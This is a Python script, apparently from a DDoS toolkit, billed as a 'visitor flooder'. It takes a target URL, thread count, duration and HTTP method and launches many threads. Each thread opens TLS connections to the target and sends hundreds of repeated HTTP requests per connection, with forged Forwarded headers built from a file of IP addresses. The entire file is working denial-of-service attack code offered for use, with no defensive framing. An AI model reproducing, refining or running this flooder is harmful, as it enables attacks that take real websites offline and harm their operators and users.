import socket,ssl,os,sys,platform,threading
from MODEL.data import generate_url_path,get_target

c = __file__
path = ''
if platform.system().upper() == 'WINDOWS':
 path = '\\'
else:
 path = '/'

FILES = ''
url = ''
methods = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   methods = str(sys.argv[4])
   FILES = 'SCAN.lst'
elif len(sys.argv) == 6:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   methods = str(sys.argv[4])
   FILES = sys.argv[5]
else:
 print(f'WELCOME TO ORIGINAL VISITOR FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <FILES LIST>')

http = []

read_lines = 0
def Read_List():
 global http,read_lines
 print(os.path.join(os.path.dirname(c) +  path + 'Lst', FILES))
 try:
  with open(os.path.join(os.path.dirname(c) +  path + 'Lst', FILES), 'r') as f3:
   for ips in f3.readlines():
    c2 = ips.replace('\n','')
    if f"http://{c2}" not in http:
     read_lines += 1
     http.append(f'http://' + ips.replace('\n',''))
 except:
   print("NOT FOUND LIST FILE . . .")
   exit()

def CONTENT(target,duration_sec_attack_dude,methods):
 global http,read_lines
 while True:
  if len(http) != 0 and len(http) == read_lines:
   break
 for url in http:
  a = url
  for _ in range(int(duration_sec_attack_dude)):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            ssl_context = ssl.SSLContext()
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if  '/' in target['uri']:
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\nForwarded: by={target['host']},{a};for={target['host']},{a};host={target['host']};proto=http,https\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\nForwarded: by={target['host']},{a};for={target['host']},{a};host={target['host']};proto=http,https\n\n\r\r".encode()
            for _ in range(500):
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
            ssl_socket.close()
        except Exception as e:
           print(e)
           pass

target = get_target(url)
threading.Thread(target=Read_List).start()
for _ in range(thread_lower):
  threading.Thread(target=CONTENT,args=(target,time_booter,methods)).start()
  threading.Thread(target=CONTENT,args=(target,time_booter,methods)).start()
  threading.Thread(target=CONTENT,args=(target,time_booter,methods)).start()
  threading.Thread(target=CONTENT,args=(target,time_booter,methods)).start()
  threading.Thread(target=CONTENT,args=(target,time_booter,methods)).start()